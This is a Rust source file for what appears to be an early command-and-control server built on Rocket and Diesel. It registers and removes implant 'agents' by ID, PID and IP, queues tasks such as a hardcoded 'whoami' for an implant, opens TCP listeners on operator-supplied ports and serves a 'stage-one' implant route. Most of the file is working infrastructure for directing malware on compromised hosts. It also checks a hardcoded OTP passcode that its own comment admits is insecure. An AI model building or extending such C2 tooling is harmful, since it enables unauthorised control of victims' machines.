use r2d2::{
    ManageConnection,
    self,
};
use chrono::{DateTime, Utc, NaiveDateTime};

use rocket_sync_db_pools::{
    diesel::{connection, r2d2::ConnectionManager},
};

use rocket::{
    data::{ FromData },
    http::{ Status },
    request::{ self, FromRequest },
    fairing::{ AdHoc },
    response::{ Debug, status::Created, stream::{EventStream, Event} },
    serde::{ Serialize, Deserialize, json::Json, ser::{SerializeSeq}, Serializer },
    form::{ Form },
    fs::{relative, FileServer,},
    Rocket,
    Build,
    FromForm,
    Request,
    State, time::{OffsetDateTime, macros::{datetime, date}, Date}, tokio::{net::{TcpListener}, sync::broadcast::{Sender, error::RecvError, channel}, select}, Shutdown,
};

use std::{
    env,
    collections::HashMap, time::SystemTime, net::{Ipv4Addr, SocketAddrV4}, sync::atomic::{AtomicUsize, Ordering},
};
use diesel::{
    prelude::*,
    Queryable,
    self,
    Identifiable,
};

use crate::{schema::{agents}, api_models::{ListenerModel, Message}};
use crate::schema::{errands};

#[database("postgres")]
struct Db(rocket_sync_db_pools::diesel::PgConnection);

pub fn establish_conn() -> PgConnection {
    dotenvy::dotenv().ok();

    let database_url = env::var("DATABASE_URL")
        .expect("DATABASE URL MUST BE SET!!");

    PgConnection::establish(&database_url)
        .expect(&format!("Error connecting to {}",  database_url))
}


// this is to get users from the database
#[derive(Serialize, Clone, Deserialize, Debug, Queryable, FromForm, Identifiable)]
#[serde(crate = "rocket::serde")] 
pub struct Agent {
    pub id: i32,
    pub agent_id: String,
    pub agent_pid: String,
    pub agent_ip: String,
}

#[derive(Insertable, Serialize, Deserialize, Debug, FromForm, Clone)]
#[table_name = "agents"]
pub struct InsertableAgent {
    pub agent_id: String,
    pub agent_pid: String,
    pub agent_ip: String,
}

impl InsertableAgent {
    fn from_agent(agent: Agent) -> InsertableAgent {
        InsertableAgent {
            agent_id: agent.agent_id,
            agent_pid: agent.agent_pid,
            agent_ip: agent.agent_ip,
        }
    }
}

#[derive(Serialize, Deserialize, Debug, FromForm, Clone)]
pub struct C2Client(pub usize);

pub struct Args {
    arguments: Vec<String>
}

#[derive(Debug, Clone, Deserialize, Serialize, FromForm)]
pub struct C2TaskModel {
    pub id: i32,
    //pub created_at: DateTime<Utc>,
    //pub executed_at: Option<DateTime<Utc>>,
    pub task: String,
    pub args: Vec<String>,
    pub result: Option<String>,

    pub implant_id: String,
}

#[derive(Debug, Clone, Deserialize, Serialize, FromForm)]
pub struct NewC2Task {
    pub task: String,
    pub args: Vec<String>,

    pub implant_id: String,
}

#[derive(Debug)]
pub enum C2Tasks {
    Args(Vec<String>),
    IsArgs(String),
    CreatedAt(DateTime<Utc>),
}

impl Serialize for C2Tasks {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
        where
            S: Serializer,
    {
        match self {
            C2Tasks::Args(ref list) => {
                let mut seq = serializer.serialize_seq(Some(list.len()))?;
                for element in list {
                    seq.serialize_element(element)?;
                }
                seq.end()
            }
            C2Tasks::IsArgs(ref arg_) => {
                serializer.serialize_str(arg_)
            }
            C2Tasks::CreatedAt(ref time_) => {
                serializer.serialize_str(&time_.to_string())
            }
        }
    }
}

#[derive(Debug, Queryable, AsChangeset, FromForm, Serialize, Deserialize, Identifiable)]
#[table_name = "agents"]
pub struct AgentModel {
    pub id: i32,
    pub agent_id:  String,
    pub agent_pid: String,
    pub agent_ip: String,
}

#[derive(Insertable, Serialize, Deserialize, Debug, FromForm)]
#[table_name = "agents"]
pub struct NewAgent<'a> {
    pub agent_id: &'a str,
    pub agent_pid: &'a str,
    pub agent_ip: &'a str,
}


impl Agent {
    pub fn create(agent: Agent, connection: &mut PgConnection) -> QueryResult<Agent> {
        let encrypted_agent = Agent {
            ..agent
        };
        diesel::insert_into(agents::table)
        .values(&InsertableAgent::from_agent(encrypted_agent))
        .execute(connection)?;

        agents::table.order(agents::id.desc()).first(connection)
    }



    //pub fn get_by_agent_id_and_pid(agent_id_: String, password_: String, connection: &//mut PgConnection) -> Option<Agent> {
    //    let res = agents::table
    //        .filter(agents::agent_id.eq(agent_id_))
    //        .get_result::<Agent>(connection);
    //    match res {
    //        Ok(agent) => {
    //                    return Some(agent)
    //                }
    //        Err(_) => {
    //            None
    //        }
    //    }
    //}
//
    //pub fn get_by_agent_id(agent_id_: String, connection: &mut PgConnection) -> //Option<Agent> {
    //    let res: Result<Agent, Error> = agents::table
    //        .filter(agents::agent_id.eq(agent_id_))
    //        .get_result::<Agent>(connection);
    //    match res {
    //        Ok(agent) => {
    //                    return Some(agent)
    //                }
    //        Err(_) => {
    //            None
    //        }
    //    }
    //}
}

#[derive(Debug, Clone, Deserialize, Serialize, FromForm)]
pub struct OTPasscode {
    pub passcode: String,
}

// TESTING

#[get("/")]
fn index() -> &'static str {
    "Hello, world!"
}

#[get("/test")]
fn test() -> &'static str {
    "Hello, agent!"
}

#[get("/checking")]
fn apply() -> Json<InsertableAgent> {
    let agent_id = "test".to_string();
    let agent_pid = "1234".to_string();
    let agent_ip = "127.0.0.1".to_string();

    Json(InsertableAgent { agent_id, agent_pid, agent_ip })
}


#[post("/submitting", data="<new_agent>")]
fn test_reg(new_agent: Form<InsertableAgent>) -> Json<InsertableAgent> {
    let _res = new_agent.into_inner();
    Json(
        InsertableAgent { 
            agent_id: (_res.agent_id), 
            agent_pid: (_res.agent_pid), 
            agent_ip: (_res.agent_ip),
        }
    )
}

#[post("/new/task", data="<new_task>")]
fn test_tasks(new_task: Form<NewC2Task>) -> Json<NewC2Task> {
    let _res = new_task.into_inner();
    Json( NewC2Task { 
        task: (_res.task), 
        args: (_res.args), 
        implant_id: (_res.implant_id) })
}

#[post("/timestamp", data="<new_task>")]
fn test_time(new_task: Form<NewC2Task>) -> Json<NewC2Task> {
    let _res = new_task.into_inner();
    println!("{:?}", chrono::offset::Local::now());

    Json( NewC2Task { 
        task: (_res.task), 
        args: (_res.args), 
        implant_id: (_res.implant_id) })
}

//TODO: Fix panic on shutdown
#[post("/new-listener", data="<z>")]
async fn create_listener(z: Form<ListenerModel> ) -> std::io::Result<()> {
    let x = z.into_inner();

    let mut listener_ = String::new();

    listener_.push_str(&String::from(x.lhost));
    listener_.push_str(&String::from(x.lport));

    println!("Listening on host {:#?}", listener_);

    let listener: TcpListener = TcpListener::bind(listener_).await?;
    match listener.accept().await {
        Ok((_socket, addr)) => println!("new client: {:?}", addr),
        Err(e) => println!("couldn't get client: {:?}", e),
    }
    

    Ok(())
}

//#[delete("/new-listener")]
//async fn create_listener() -> std::io::Result<()> {
//    let target_listener = 
//
//    drop(&target_listener);
//
//    match listener.accept().await {
//        Ok((_socket, addr)) => println!("new client: {:?}", addr),
//        Err(e) => println!("couldn't get client: {:?}", e),
//    }
//
//    Ok(())
//}


// Chat room 

static USER_COUNTER: AtomicUsize = AtomicUsize::new(0);

#[get("/events")]
async fn events(queue: &State<Sender<Message>>, mut end: Shutdown) -> EventStream![] {
    let mut rx = queue.subscribe();
    EventStream! {
        loop {
            let msg = select! {
                msg = rx.recv() => match msg {
                    Ok(msg) => msg,
                    Err(RecvError::Closed) => break,
                    Err(RecvError::Lagged(_)) => continue,
                },
                _ = &mut end => break,
            };

            yield Event::json(&msg);
        }
    }
}

#[rocket::async_trait]
impl<'r> FromRequest<'r> for &'r C2Client {
    type Error = ();

    async fn from_request(request: &'r Request<'_>) -> request::Outcome<Self, Self::Error> {
        request::Outcome::Success(request.local_cache(|| {
            C2Client(USER_COUNTER.fetch_add(1, Ordering::Relaxed))
        }))
    }
}

#[post("/message", data = "<form>")]
fn post_message(form: Form<Message>, queue: &State<Sender<Message>>) {
    let _res = queue.send(form.into_inner());
}

#[get("/chat-users")]
fn c2_users(id: &C2Client) -> Json<usize> {
    Json(id.0)
}



// implant routes

#[get("/stage-one")]
fn stage_one() -> Json<String> {
    let _x = String::from("TESTING IMPLANT");
    return Json(_x)
}

//TODO: Make this actually secure
#[post("/otp-reg", data="<otp>")]
fn otp_reg(otp: Form<OTPasscode>) -> Status {
    let shh = otp.into_inner();

    let eval = String::from(shh.passcode);
    
    if eval == String::from("henfcv*##&bfsx") {
        Status::Accepted
    } else {
        Status::NotFound
    }
}

#[post("/new/task", data="<new_task>")]
fn test_fetch_task(new_task: Form<NewC2Task>) -> Json<NewC2Task> {
    let _res = new_task.into_inner();
    Json( NewC2Task { 
        task: (_res.task), 
        args: (_res.args), 
        implant_id: (_res.implant_id) })
}

#[get("/new/tasks")]
fn test_fetch_commands() -> Json<NewC2Task> {
    //let _res = new_task.into_inner();
    let _args = Vec::new();
    Json( NewC2Task { 
        task: (String::from("whoami")), 
        args: (_args), 
        implant_id: (String::from("MG7RF6")) 
    })
}


// END OF TESTING


// VIEW AGENTS
#[get("/view-agents")]
fn get_agents() -> Json<Vec<AgentModel>> {
    use crate::schema::agents::dsl::*;
    let connection: &mut PgConnection = &mut establish_conn();

    let results: Json<Vec<AgentModel>> = agents.load::<AgentModel>(connection)
        .map(Json)
        .expect("Error loading agents");

    println!("[+] SUCCESS \nFound {} agents. \n", results.len());

    return Json(results.into_inner());

}

//LOG AGENTS TO DB
#[post("/register", data="<db_agent>")]
fn register_agent(db_agent: Form<InsertableAgent>) -> Json<InsertableAgent> {
    use crate::schema::agents::dsl::*;

    // connecting to db
    let connection: &mut PgConnection = &mut establish_conn();


    let _new_agent = NewAgent {
        agent_id: &db_agent.agent_id,
        agent_pid: &db_agent.agent_pid,
        agent_ip: &db_agent.agent_ip,
    };
    println!("agent data parsed!");
    
    //TODO: Add better error handling
    diesel::insert_into(agents)
    .values(&_new_agent)
    .execute(connection)
        .map(Json)
        .map_err(|_| Status::InternalServerError)
        .ok();

    println!("logged in db!!!!!");

    Json(
        InsertableAgent { 
            agent_id: ((*db_agent.agent_id)).to_string(), 
            agent_pid: (*db_agent.agent_pid).to_string(), 
            agent_ip: (*db_agent.agent_ip).to_string(),
        }
    )
}


// Remove Agents
#[delete("/remove-agent/<target_id>")]
fn remove_agent(target_id: String) {
    let agent_id_: String = target_id;
    use crate::schema::agents::dsl::*;
  
    let connection: &mut PgConnection = &mut establish_conn();
    let agent_deleted = diesel::delete(agents)
    .filter(agent_id.like(&agent_id_))
    .execute(connection)
    .expect("ERrrror!");

    println!("agent removed: {:#?}", agent_deleted);

    //format!("Successfully removed agent: {:#?} from db.", target_id)
}





pub fn stage() -> AdHoc {
    AdHoc::on_ignite("Diesel Stage", |rocket: Rocket<Build> | async {
        rocket.attach(Db::fairing())
            //.attach(AdHoc::try_on_ignite("Diesel Migrations", run_migrations))
            .manage(channel::<Message>(1024).0)
            .mount("/api", routes![
                // opsec
                index,
                test_reg,
                // implant handling
                register_agent,
                get_agents,
                remove_agent,
                // task handling
                test_tasks,
                test_time,
                // listener handling
                create_listener,
                // C2 Operations handling
                events,
                post_message,
                c2_users,
                stage_one,
                otp_reg,
                test_fetch_commands,

            ]
        )
        .mount("/", FileServer::from(relative!("static")))
    })
}
